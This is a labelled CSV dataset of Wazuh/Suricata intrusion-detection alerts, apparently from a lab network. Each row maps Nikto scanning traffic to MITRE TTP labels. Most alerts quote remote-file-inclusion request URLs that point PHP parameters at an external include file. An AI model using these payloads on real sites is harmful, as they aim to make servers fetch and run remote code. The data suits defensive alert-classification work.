timestamp,alert,description,real_ttps,possible_ttps
2025-09-22T16:29:48.417+0000,"{""timestamp"": ""2025-09-22T16:29:48.417+0000"", ""rule"": {""level"": 3, ""description"": ""Suricata: Alert - ET WEB_SPECIFIC_APPS Possible eFront database.php Remote File Inclusion Attempt"", ""id"": ""86601"", ""firedtimes"": 647, ""mail"": false, ""groups"": [""ids"", ""suricata""]}, ""agent"": {""id"": ""001"", ""name"": ""inetfw"", ""ip"": ""192.168.100.254""}, ""manager"": {""name"": ""wazuh""}, ""id"": ""1758558588.7798179"", ""decoder"": {""name"": ""json""}, ""data"": {""timestamp"": ""2025-09-22T16:29:36.950333+0000"", ""flow_id"": ""2003018017961758.000000"", ""in_iface"": ""ens5"", ""event_type"": ""alert"", ""src_ip"": ""192.42.1.174"", ""src_port"": ""55554"", ""dest_ip"": ""172.17.100.121"", ""dest_port"": ""80"", ""proto"": ""TCP"", ""community_id"": ""1:lubi6vKMT90qPC/jK0gMZb6YGJ4="", ""tx_id"": ""45"", ""alert"": {""action"": ""allowed"", ""gid"": ""1"", ""signature_id"": ""2009932"", ""rev"": ""6"", ""signature"": ""ET WEB_SPECIFIC_APPS Possible eFront database.php Remote File Inclusion Attempt"", ""category"": ""Web Application Attack"", ""severity"": ""1"", ""metadata"": {""confidence"": [""Medium""], ""created_at"": [""2010_07_30""], ""mitre_tactic_id"": [""TA0001""], ""mitre_tactic_name"": [""Initial_Access""], ""mitre_technique_id"": [""T1190""], ""mitre_technique_name"": [""Exploit_Public_Facing_Application""], ""signature_severity"": [""Major""], ""updated_at"": [""2020_09_09""]}}, ""http"": {""hostname"": ""video.attackbed.com"", ""url"": ""/libraries/database.php?path=http://cirt.net/rfiinc.txt????"", ""http_user_agent"": ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005253)"", ""http_content_type"": ""text/html"", ""http_method"": ""GET"", ""protocol"": ""HTTP/1.1"", ""status"": ""404"", ""length"": ""196""}, ""app_proto"": ""http"", ""flow"": {""pkts_toserver"": ""50"", ""pkts_toclient"": ""52"", ""bytes_toserver"": ""12883"", ""bytes_toclient"": ""21657"", ""start"": ""2025-09-22T16:29:36.882462+0000""}}, ""location"": ""/var/log/suricata/eve.json""}",Suricata: Alert - ET WEB_SPECIFIC_APPS Possible eFront database.php Remote File Inclusion Attempt,[],['T1595.002']
2025-09-22T16:29:48.423+0000,"{""timestamp"": ""2025-09-22T16:29:48.423+0000"", ""rule"": {""level"": 3, ""description"": ""Suricata: Alert - ET WEB_SPECIFIC_APPS SERWeb load_lang.php configdir Parameter Remote File Inclusion"", ""id"": ""86601"", ""firedtimes"": 648, ""mail"": false, ""groups"": [""ids"", ""suricata""]}, ""agent"": {""id"": ""001"", ""name"": ""inetfw"", ""ip"": ""192.168.100.254""}, ""manager"": {""name"": ""wazuh""}, ""id"": ""1758558588.7800939"", ""decoder"": {""name"": ""json""}, ""data"": {""timestamp"": ""2025-09-22T16:29:36.971721+0000"", ""flow_id"": ""2003018017961758.000000"", ""in_iface"": ""ens5"", ""event_type"": ""alert"", ""src_ip"": ""192.42.1.174"", ""src_port"": ""55554"", ""dest_ip"": ""172.17.100.121"", ""dest_port"": ""80"", ""proto"": ""TCP"", ""community_id"": ""1:lubi6vKMT90qPC/jK0gMZb6YGJ4="", ""tx_id"": ""62"", ""alert"": {""action"": ""allowed"", ""gid"": ""1"", ""signature_id"": ""2010124"", ""rev"": ""5"", ""signature"": ""ET WEB_SPECIFIC_APPS SERWeb load_lang.php configdir Parameter Remote File Inclusion"", ""category"": ""Web Application Attack"", ""severity"": ""1"", ""metadata"": {""created_at"": [""2010_07_30""], ""mitre_tactic_id"": [""TA0001""], ""mitre_tactic_name"": [""Initial_Access""], ""mitre_technique_id"": [""T1190""], ""mitre_technique_name"": [""Exploit_Public_Facing_Application""], ""signature_severity"": [""Major""], ""updated_at"": [""2020_09_09""]}}, ""http"": {""hostname"": ""video.attackbed.com"", ""url"": ""/load_lang.php?_SERWEB[configdir]=http://cirt.net/rfiinc.txt?"", ""http_user_agent"": ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005270)"", ""http_content_type"": ""text/html"", ""http_method"": ""GET"", ""protocol"": ""HTTP/1.1"", ""status"": ""404"", ""length"": ""196""}, ""app_proto"": ""http"", ""flow"": {""pkts_toserver"": ""67"", ""pkts_toclient"": ""69"", ""bytes_toserver"": ""17458"", ""bytes_toclient"": ""29511"", ""start"": ""2025-09-22T16:29:36.882462+0000""}}, ""location"": ""/var/log/suricata/eve.json""}",Suricata: Alert - ET WEB_SPECIFIC_APPS SERWeb load_lang.php configdir Parameter Remote File Inclusion,[],['T1595.002']
2025-09-22T16:29:48.454+0000,"{""timestamp"": ""2025-09-22T16:29:48.454+0000"", ""rule"": {""level"": 3, ""description"": ""Suricata: Alert - ET WEB_SPECIFIC_APPS FormMailer formmailer.admin.inc.php BASE_DIR Parameter Remote File Inclusion Attempt"", ""id"": ""86601"", ""firedtimes"": 649, ""mail"": false, ""groups"": [""ids"", ""suricata""]}, ""agent"": {""id"": ""001"", ""name"": ""inetfw"", ""ip"": ""192.168.100.254""}, ""manager"": {""name"": ""wazuh""}, ""id"": ""1758558588.7803653"", ""decoder"": {""name"": ""json""}, ""data"": {""timestamp"": ""2025-09-22T16:29:37.143552+0000"", ""flow_id"": ""2007819791447067.000000"", ""in_iface"": ""ens5"", ""event_type"": ""alert"", ""src_ip"": ""192.42.1.174"", ""src_port"": ""55568"", ""dest_ip"": ""172.17.100.121"", ""dest_port"": ""80"", ""proto"": ""TCP"", ""community_id"": ""1:LKEKyN4U8W5vHUdLNuHsi7uGeiw="", ""tx_id"": ""100"", ""alert"": {""action"": ""allowed"", ""gid"": ""1"", ""signature_id"": ""2010484"", ""rev"": ""6"", ""signature"": ""ET WEB_SPECIFIC_APPS FormMailer formmailer.admin.inc.php BASE_DIR Parameter Remote File Inclusion Attempt"", ""category"": ""Web Application Attack"", ""severity"": ""1"", ""metadata"": {""created_at"": [""2010_07_30""], ""mitre_tactic_id"": [""TA0001""], ""mitre_tactic_name"": [""Initial_Access""], ""mitre_technique_id"": [""T1190""], ""mitre_technique_name"": [""Exploit_Public_Facing_Application""], ""signature_severity"": [""Major""], ""updated_at"": [""2020_09_11""]}}, ""http"": {""hostname"": ""video.attackbed.com"", ""url"": ""/modules/formmailer/formmailer.admin.inc.php?BASE_DIR[jax_formmailer]=http://cirt.net/rfiinc.txt??"", ""http_user_agent"": ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005408)"", ""http_content_type"": ""text/html"", ""http_method"": ""GET"", ""protocol"": ""HTTP/1.1"", ""status"": ""404"", ""length"": ""196""}, ""app_proto"": ""http"", ""flow"": {""pkts_toserver"": ""105"", ""pkts_toclient"": ""113"", ""bytes_toserver"": ""27885"", ""bytes_toclient"": ""47418"", ""start"": ""2025-09-22T16:29:37.013339+0000""}}, ""location"": ""/var/log/suricata/eve.json""}",Suricata: Alert - ET WEB_SPECIFIC_APPS FormMailer formmailer.admin.inc.php BASE_DIR Parameter Remote File Inclusion Attempt,[],['T1595.002']
2025-09-22T16:30:36.980+0000,"{""timestamp"": ""2025-09-22T16:30:36.980+0000"", ""rule"": {""level"": 3, ""description"": ""Suricata: Alert - SURICATA STREAM ESTABLISHED invalid ack"", ""id"": ""86601"", ""firedtimes"": 907, ""mail"": false, ""groups"": [""ids"", ""suricata""]}, ""agent"": {""id"": ""001"", ""name"": ""inetfw"", ""ip"": ""192.168.100.254""}, ""manager"": {""name"": ""wazuh""}, ""id"": ""1758558636.11286891"", ""decoder"": {""name"": ""json""}, ""data"": {""timestamp"": ""2025-09-22T16:30:29.057042+0000"", ""flow_id"": ""1499967829041701.000000"", ""in_iface"": ""ens5"", ""event_type"": ""alert"", ""src_ip"": ""172.17.100.121"", ""src_port"": ""80"", ""dest_ip"": ""192.42.1.174"", ""dest_port"": ""35618"", ""proto"": ""TCP"", ""metadata"": {""flowints"": {""http"": {""anomaly"": {""count"": ""7""}}}}, ""community_id"": ""1:IwSdrZN/bwWFIkID5Mdosk4wpsQ="", ""alert"": {""action"": ""allowed"", ""gid"": ""1"", ""signature_id"": ""2210029"", ""rev"": ""2"", ""signature"": ""SURICATA STREAM ESTABLISHED invalid ack"", ""category"": ""Generic Protocol Command Decode"", ""severity"": ""3""}, ""app_proto"": ""http"", ""flow"": {""pkts_toserver"": ""20"", ""pkts_toclient"": ""30"", ""bytes_toserver"": ""3322"", ""bytes_toclient"": ""10854"", ""start"": ""2025-09-22T16:30:23.778789+0000""}}, ""location"": ""/var/log/suricata/eve.json""}",Suricata: Alert - SURICATA STREAM ESTABLISHED invalid ack,[],['T1595.003']
2025-09-22T16:30:36.981+0000,"{""timestamp"": ""2025-09-22T16:30:36.981+0000"", ""rule"": {""level"": 3, ""description"": ""Suricata: Alert - SURICATA STREAM Packet with invalid ack"", ""id"": ""86601"", ""firedtimes"": 908, ""mail"": false, ""groups"": [""ids"", ""suricata""]}, ""agent"": {""id"": ""001"", ""name"": ""inetfw"", ""ip"": ""192.168.100.254""}, ""manager"": {""name"": ""wazuh""}, ""id"": ""1758558636.11288374"", ""decoder"": {""name"": ""json""}, ""data"": {""timestamp"": ""2025-09-22T16:30:29.057042+0000"", ""flow_id"": ""1499967829041701.000000"", ""in_iface"": ""ens5"", ""event_type"": ""alert"", ""src_ip"": ""172.17.100.121"", ""src_port"": ""80"", ""dest_ip"": ""192.42.1.174"", ""dest_port"": ""35618"", ""proto"": ""TCP"", ""metadata"": {""flowints"": {""http"": {""anomaly"": {""count"": ""7""}}}}, ""community_id"": ""1:IwSdrZN/bwWFIkID5Mdosk4wpsQ="", ""alert"": {""action"": ""allowed"", ""gid"": ""1"", ""signature_id"": ""2210045"", ""rev"": ""2"", ""signature"": ""SURICATA STREAM Packet with invalid ack"", ""category"": ""Generic Protocol Command Decode"", ""severity"": ""3""}, ""app_proto"": ""http"", ""flow"": {""pkts_toserver"": ""20"", ""pkts_toclient"": ""30"", ""bytes_toserver"": ""3322"", ""bytes_toclient"": ""10854"", ""start"": ""2025-09-22T16:30:23.778789+0000""}}, ""location"": ""/var/log/suricata/eve.json""}",Suricata: Alert - SURICATA STREAM Packet with invalid ack,[],['T1595.003']
2025-09-22T16:30:36.995+0000,"{""timestamp"": ""2025-09-22T16:30:36.995+0000"", ""rule"": {""level"": 3, ""description"": ""Suricata: Alert - SURICATA STREAM FIN invalid ack"", ""id"": ""86601"", ""firedtimes"": 911, ""mail"": false, ""groups"": [""ids"", ""suricata""]}, ""agent"": {""id"": ""001"", ""name"": ""inetfw"", ""ip"": ""192.168.100.254""}, ""manager"": {""name"": ""wazuh""}, ""id"": ""1758558636.11296524"", ""decoder"": {""name"": ""json""}, ""data"": {""timestamp"": ""2025-09-22T16:30:29.060279+0000"", ""flow_id"": ""1499967829041701.000000"", ""in_iface"": ""ens5"", ""event_type"": ""alert"", ""src_ip"": ""192.42.1.174"", ""src_port"": ""35618"", ""dest_ip"": ""172.17.100.121"", ""dest_port"": ""80"", ""proto"": ""TCP"", ""metadata"": {""flowints"": {""http"": {""anomaly"": {""count"": ""7""}}}}, ""community_id"": ""1:IwSdrZN/bwWFIkID5Mdosk4wpsQ="", ""alert"": {""action"": ""allowed"", ""gid"": ""1"", ""signature_id"": ""2210030"", ""rev"": ""2"", ""signature"": ""SURICATA STREAM FIN invalid ack"", ""category"": ""Generic Protocol Command Decode"", ""severity"": ""3""}, ""app_proto"": ""http"", ""flow"": {""pkts_toserver"": ""22"", ""pkts_toclient"": ""30"", ""bytes_toserver"": ""3454"", ""bytes_toclient"": ""10854"", ""start"": ""2025-09-22T16:30:23.778789+0000""}}, ""location"": ""/var/log/suricata/eve.json""}",Suricata: Alert - SURICATA STREAM FIN invalid ack,[],['T1595.003']
2025-09-24T07:49:00.957+0000,"{""timestamp"": ""2025-09-24T07:49:00.957+0000"", ""rule"": {""level"": 3, ""description"": ""Suricata: Alert - ET WEB_SERVER ColdFusion componentutils access"", ""id"": ""86601"", ""firedtimes"": 531, ""mail"": false, ""groups"": [""ids"", ""suricata""]}, ""agent"": {""id"": ""001"", ""name"": ""inetfw"", ""ip"": ""192.168.100.254""}, ""manager"": {""name"": ""wazuh""}, ""id"": ""1758700140.6487827"", ""decoder"": {""name"": ""json""}, ""data"": {""timestamp"": ""2025-09-24T07:48:49.403722+0000"", ""flow_id"": ""839385362792795.000000"", ""in_iface"": ""ens5"", ""event_type"": ""alert"", ""src_ip"": ""192.42.1.174"", ""src_port"": ""38618"", ""dest_ip"": ""172.17.100.121"", ""dest_port"": ""80"", ""proto"": ""TCP"", ""community_id"": ""1:i8GrYMHpmDM0KXSpTN68vqb6zDY="", ""tx_id"": ""10"", ""alert"": {""action"": ""allowed"", ""gid"": ""1"", ""signature_id"": ""2016182"", ""rev"": ""7"", ""signature"": ""ET WEB_SERVER ColdFusion componentutils access"", ""category"": ""Web Application Attack"", ""severity"": ""1"", ""metadata"": {""created_at"": [""2013_01_09""], ""signature_severity"": [""Minor""], ""updated_at"": [""2020_04_22""]}}, ""http"": {""hostname"": ""video.attackbed.com"", ""url"": ""/CFIDE/componentutils/cfcexplorer.cfc"", ""http_user_agent"": ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003592)"", ""http_content_type"": ""text/html"", ""http_method"": ""GET"", ""protocol"": ""HTTP/1.1"", ""status"": ""404"", ""length"": ""196""}, ""app_proto"": ""http"", ""flow"": {""pkts_toserver"": ""15"", ""pkts_toclient"": ""23"", ""bytes_toserver"": ""2884"", ""bytes_toclient"": ""5883"", ""start"": ""2025-09-24T07:48:49.393563+0000""}}, ""location"": ""/var/log/suricata/eve.json""}",Suricata: Alert - ET WEB_SERVER ColdFusion componentutils access,[],['T1595.002']
2025-09-24T07:49:02.255+0000,"{""timestamp"": ""2025-09-24T07:49:02.255+0000"", ""rule"": {""level"": 3, ""description"": ""Suricata: Alert - ET WEB_SPECIFIC_APPS YapBB class_yapbbcooker.php cfgIncludeDirectory Parameter Remote File Inclusion"", ""id"": ""86601"", ""firedtimes"": 542, ""mail"": false, ""groups"": [""ids"", ""suricata""]}, ""agent"": {""id"": ""001"", ""name"": ""inetfw"", ""ip"": ""192.168.100.254""}, ""manager"": {""name"": ""wazuh""}, ""id"": ""1758700142.6596171"", ""decoder"": {""name"": ""json""}, ""data"": {""timestamp"": ""2025-09-24T07:48:51.073936+0000"", ""flow_id"": ""609527303111099.000000"", ""in_iface"": ""ens5"", ""event_type"": ""alert"", ""src_ip"": ""192.42.1.174"", ""src_port"": ""38758"", ""dest_ip"": ""172.17.100.121"", ""dest_port"": ""80"", ""proto"": ""TCP"", ""community_id"": ""1:z556t3lraEiP7va5lgoPbgyzHr8="", ""tx_id"": ""92"", ""alert"": {""action"": ""allowed"", ""gid"": ""1"", ""signature_id"": ""2009316"", ""rev"": ""6"", ""signature"": ""ET WEB_SPECIFIC_APPS YapBB class_yapbbcooker.php cfgIncludeDirectory Parameter Remote File Inclusion"", ""category"": ""Web Application Attack"", ""severity"": ""1"", ""metadata"": {""created_at"": [""2010_07_30""], ""mitre_tactic_id"": [""TA0001""], ""mitre_tactic_name"": [""Initial_Access""], ""mitre_technique_id"": [""T1190""], ""mitre_technique_name"": [""Exploit_Public_Facing_Application""], ""signature_severity"": [""Major""], ""updated_at"": [""2020_09_09""]}}, ""http"": {""hostname"": ""video.attackbed.com"", ""url"": ""/include/class_yapbbcooker.php?cfgIncludeDirectory=http://cirt.net/rfiinc.txt?"", ""http_user_agent"": ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004903)"", ""http_content_type"": ""text/html"", ""http_method"": ""GET"", ""protocol"": ""HTTP/1.1"", ""status"": ""404"", ""length"": ""196""}, ""app_proto"": ""http"", ""flow"": {""pkts_toserver"": ""97"", ""pkts_toclient"": ""118"", ""bytes_toserver"": ""24968"", ""bytes_toclient"": ""44623"", ""start"": ""2025-09-24T07:48:50.983483+0000""}}, ""location"": ""/var/log/suricata/eve.json""}",Suricata: Alert - ET WEB_SPECIFIC_APPS YapBB class_yapbbcooker.php cfgIncludeDirectory Parameter Remote File Inclusion,[],['T1595.002']
2025-09-24T07:49:02.537+0000,"{""timestamp"": ""2025-09-24T07:49:02.537+0000"", ""rule"": {""level"": 3, ""description"": ""Suricata: Alert - ET WEB_SPECIFIC_APPS AjaxPortal di.php pathtoserverdata Parameter Remote File Inclusion Attempt"", ""id"": ""86601"", ""firedtimes"": 544, ""mail"": false, ""groups"": [""ids"", ""suricata""]}, ""agent"": {""id"": ""001"", ""name"": ""inetfw"", ""ip"": ""192.168.100.254""}, ""manager"": {""name"": ""wazuh""}, ""id"": ""1758700142.6601707"", ""decoder"": {""name"": ""json""}, ""data"": {""timestamp"": ""2025-09-24T07:48:51.366565+0000"", ""flow_id"": ""2110721452379920.000000"", ""in_iface"": ""ens5"", ""event_type"": ""alert"", ""src_ip"": ""192.42.1.174"", ""src_port"": ""38792"", ""dest_ip"": ""172.17.100.121"", ""dest_port"": ""80"", ""proto"": ""TCP"", ""community_id"": ""1:D62OVocH55pQz8WaV5zJODEVg6E="", ""tx_id"": ""65"", ""alert"": {""action"": ""allowed"", ""gid"": ""1"", ""signature_id"": ""2010362"", ""rev"": ""6"", ""signature"": ""ET WEB_SPECIFIC_APPS AjaxPortal di.php pathtoserverdata Parameter Remote File Inclusion Attempt"", ""category"": ""Web Application Attack"", ""severity"": ""1"", ""metadata"": {""created_at"": [""2010_07_30""], ""mitre_tactic_id"": [""TA0001""], ""mitre_tactic_name"": [""Initial_Access""], ""mitre_technique_id"": [""T1190""], ""mitre_technique_name"": [""Exploit_Public_Facing_Application""], ""signature_severity"": [""Major""], ""updated_at"": [""2020_09_10""]}}, ""http"": {""hostname"": ""video.attackbed.com"", ""url"": ""/install/di.php?pathtoserverdata=http://cirt.net/rfiinc.txt?"", ""http_user_agent"": ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005179)"", ""http_content_type"": ""text/html"", ""http_method"": ""GET"", ""protocol"": ""HTTP/1.1"", ""status"": ""404"", ""length"": ""196""}, ""app_proto"": ""http"", ""flow"": {""pkts_toserver"": ""70"", ""pkts_toclient"": ""85"", ""bytes_toserver"": ""17140"", ""bytes_toclient"": ""31755"", ""start"": ""2025-09-24T07:48:51.298768+0000""}}, ""location"": ""/var/log/suricata/eve.json""}",Suricata: Alert - ET WEB_SPECIFIC_APPS AjaxPortal di.php pathtoserverdata Parameter Remote File Inclusion Attempt,[],['T1595.002']
2025-09-24T07:49:02.630+0000,"{""timestamp"": ""2025-09-24T07:49:02.630+0000"", ""rule"": {""level"": 3, ""description"": ""Suricata: Alert - ET WEB_SPECIFIC_APPS p-Table for WordPress wptable-tinymce.php ABSPATH Parameter RFI Attempt"", ""id"": ""86601"", ""firedtimes"": 545, ""mail"": false, ""groups"": [""ids"", ""suricata""]}, ""agent"": {""id"": ""001"", ""name"": ""inetfw"", ""ip"": ""192.168.100.254""}, ""manager"": {""name"": ""wazuh""}, ""id"": ""1758700142.6604459"", ""decoder"": {""name"": ""json""}, ""data"": {""timestamp"": ""2025-09-24T07:48:51.392633+0000"", ""flow_id"": ""2110721452379920.000000"", ""in_iface"": ""ens5"", ""event_type"": ""alert"", ""src_ip"": ""192.42.1.174"", ""src_port"": ""38792"", ""dest_ip"": ""172.17.100.121"", ""dest_port"": ""80"", ""proto"": ""TCP"", ""community_id"": ""1:D62OVocH55pQz8WaV5zJODEVg6E="", ""tx_id"": ""87"", ""alert"": {""action"": ""allowed"", ""gid"": ""1"", ""signature_id"": ""2010473"", ""rev"": ""6"", ""signature"": ""ET WEB_SPECIFIC_APPS p-Table for WordPress wptable-tinymce.php ABSPATH Parameter RFI Attempt"", ""category"": ""Web Application Attack"", ""severity"": ""1"", ""metadata"": {""affected_product"": [""Wordpress_Plugins"", ""Wordpress""], ""attack_target"": [""Web_Server""], ""created_at"": [""2010_07_30""], ""deployment"": [""Datacenter""], ""signature_severity"": [""Major""], ""tag"": [""Wordpress""], ""updated_at"": [""2020_09_09""]}}, ""http"": {""hostname"": ""video.attackbed.com"", ""url"": ""/js/wptable-tinymce.php?ABSPATH=http://cirt.net/rfiinc.txt?"", ""http_user_agent"": ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005201)"", ""http_content_type"": ""text/html"", ""http_method"": ""GET"", ""protocol"": ""HTTP/1.1"", ""status"": ""404"", ""length"": ""196""}, ""app_proto"": ""http"", ""flow"": {""pkts_toserver"": ""92"", ""pkts_toclient"": ""107"", ""bytes_toserver"": ""23149"", ""bytes_toclient"": ""41919"", ""start"": ""2025-09-24T07:48:51.298768+0000""}}, ""location"": ""/var/log/suricata/eve.json""}",Suricata: Alert - ET WEB_SPECIFIC_APPS p-Table for WordPress wptable-tinymce.php ABSPATH Parameter RFI Attempt,[],['T1595.002']
2025-09-24T07:49:02.858+0000,"{""timestamp"": ""2025-09-24T07:49:02.858+0000"", ""rule"": {""level"": 3, ""description"": ""Suricata: Alert - ET WEB_SPECIFIC_APPS OpenX phpAdsNew phpAds_geoPlugin Parameter Remote File Inclusion Attempt"", ""id"": ""86601"", ""firedtimes"": 547, ""mail"": false, ""groups"": [""ids"", ""suricata""]}, ""agent"": {""id"": ""001"", ""name"": ""inetfw"", ""ip"": ""192.168.100.254""}, ""manager"": {""name"": ""wazuh""}, ""id"": ""1758700142.6609907"", ""decoder"": {""name"": ""json""}, ""data"": {""timestamp"": ""2025-09-24T07:48:51.454781+0000"", ""flow_id"": ""2151119914735024.000000"", ""in_iface"": ""ens5"", ""event_type"": ""alert"", ""src_ip"": ""192.42.1.174"", ""src_port"": ""38806"", ""dest_ip"": ""172.17.100.121"", ""dest_port"": ""80"", ""proto"": ""TCP"", ""community_id"": ""1:2s0g7iU6PPtorVkUBsPtfLncTOw="", ""tx_id"": ""46"", ""alert"": {""action"": ""allowed"", ""gid"": ""1"", ""signature_id"": ""2011274"", ""rev"": ""6"", ""signature"": ""ET WEB_SPECIFIC_APPS OpenX phpAdsNew phpAds_geoPlugin Parameter Remote File Inclusion Attempt"", ""category"": ""Web Application Attack"", ""severity"": ""1"", ""metadata"": {""created_at"": [""2010_07_30""], ""mitre_tactic_id"": [""TA0001""], ""mitre_tactic_name"": [""Initial_Access""], ""mitre_technique_id"": [""T1190""], ""mitre_technique_name"": [""Exploit_Public_Facing_Application""], ""signature_severity"": [""Major""], ""updated_at"": [""2020_09_04""]}}, ""http"": {""hostname"": ""video.attackbed.com"", ""url"": ""/libraries/lib-remotehost.inc.php?phpAds_geoPlugin=http://cirt.net/rfiinc.txt?"", ""http_user_agent"": ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005254)"", ""http_content_type"": ""text/html"", ""http_method"": ""GET"", ""protocol"": ""HTTP/1.1"", ""status"": ""404"", ""length"": ""196""}, ""app_proto"": ""http"", ""flow"": {""pkts_toserver"": ""51"", ""pkts_toclient"": ""59"", ""bytes_toserver"": ""13157"", ""bytes_toclient"": ""22515"", ""start"": ""2025-09-24T07:48:51.398768+0000""}}, ""location"": ""/var/log/suricata/eve.json""}",Suricata: Alert - ET WEB_SPECIFIC_APPS OpenX phpAdsNew phpAds_geoPlugin Parameter Remote File Inclusion Attempt,[],['T1595.002']
2025-09-24T07:49:03.059+0000,"{""timestamp"": ""2025-09-24T07:49:03.059+0000"", ""rule"": {""level"": 3, ""description"": ""Suricata: Alert - ET WEB_SPECIFIC_APPS Sisplet CMS komentar.php site_path Parameter Remote File Inclusion Attempt"", ""id"": ""86601"", ""firedtimes"": 549, ""mail"": false, ""groups"": [""ids"", ""suricata""]}, ""agent"": {""id"": ""001"", ""name"": ""inetfw"", ""ip"": ""192.168.100.254""}, ""manager"": {""name"": ""wazuh""}, ""id"": ""1758700143.6615399"", ""decoder"": {""name"": ""json""}, ""data"": {""timestamp"": ""2025-09-24T07:48:51.505243+0000"", ""flow_id"": ""2151119914735024.000000"", ""in_iface"": ""ens5"", ""event_type"": ""alert"", ""src_ip"": ""192.42.1.174"", ""src_port"": ""38806"", ""dest_ip"": ""172.17.100.121"", ""dest_port"": ""80"", ""proto"": ""TCP"", ""community_id"": ""1:2s0g7iU6PPtorVkUBsPtfLncTOw="", ""tx_id"": ""93"", ""alert"": {""action"": ""allowed"", ""gid"": ""1"", ""signature_id"": ""2010564"", ""rev"": ""5"", ""signature"": ""ET WEB_SPECIFIC_APPS Sisplet CMS komentar.php site_path Parameter Remote File Inclusion Attempt"", ""category"": ""Web Application Attack"", ""severity"": ""1"", ""metadata"": {""created_at"": [""2010_07_30""], ""mitre_tactic_id"": [""TA0001""], ""mitre_tactic_name"": [""Initial_Access""], ""mitre_technique_id"": [""T1190""], ""mitre_technique_name"": [""Exploit_Public_Facing_Application""], ""signature_severity"": [""Major""], ""updated_at"": [""2020_09_09""]}}, ""http"": {""hostname"": ""video.attackbed.com"", ""url"": ""/main/forum/komentar.php?site_path=http://cirt.net/rfiinc.txt?"", ""http_user_agent"": ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005301)"", ""http_content_type"": ""text/html"", ""http_method"": ""GET"", ""protocol"": ""HTTP/1.1"", ""status"": ""404"", ""length"": ""196""}, ""app_proto"": ""http"", ""flow"": {""pkts_toserver"": ""98"", ""pkts_toclient"": ""106"", ""bytes_toserver"": ""25498"", ""bytes_toclient"": ""44226"", ""start"": ""2025-09-24T07:48:51.398768+0000""}}, ""location"": ""/var/log/suricata/eve.json""}",Suricata: Alert - ET WEB_SPECIFIC_APPS Sisplet CMS komentar.php site_path Parameter Remote File Inclusion Attempt,[],['T1595.002']
